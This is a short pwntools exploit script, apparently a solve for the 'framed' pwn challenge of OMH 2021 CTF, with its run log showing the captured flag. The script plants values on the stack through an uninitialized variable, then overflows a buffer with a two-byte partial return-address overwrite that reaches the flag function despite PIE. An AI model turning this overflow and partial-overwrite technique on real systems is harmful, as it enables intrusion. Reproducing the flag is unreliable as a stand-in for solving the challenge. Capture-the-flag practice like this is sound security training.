from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './framed'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "framed.zajebistyc.tf"
  PORT = 17005
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})

s.recvuntil("Hello, what is your name?\n")
s.sendline("A"*48+p32(0xdeadbeef)+p32(0xcafebabe))

s.recvuntil("How many shuffles?\n")
s.sendline("0")

s.recvuntil("Seems you're lucky!\n")
#pause()
s.send("B"*56+p64(elf.sym.flag)[:2])

s.interactive()

'''
mito@ubuntu:~/CTF/OMH_2021_CTF/Pwn_Framed/framed/for_players$ python solve.py r
[*] '/home/mito/CTF/OMH_2021_CTF/Pwn_Framed/framed/for_players/framed'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to framed.zajebistyc.tf on port 17005: Done
[*] Switching to interactive mode
Read 58 payload bytes
flat{uninitialized_variables_are_not_really_uninitialized}
'''
